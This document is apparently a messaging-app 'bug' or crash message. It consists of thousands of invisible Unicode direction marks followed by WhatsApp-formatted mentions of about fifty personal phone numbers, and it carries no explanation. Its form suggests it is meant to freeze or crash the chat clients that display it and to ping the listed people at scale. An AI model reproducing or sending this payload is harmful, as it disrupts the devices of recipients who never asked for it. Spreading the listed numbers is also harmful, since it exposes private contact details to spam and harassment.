‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ 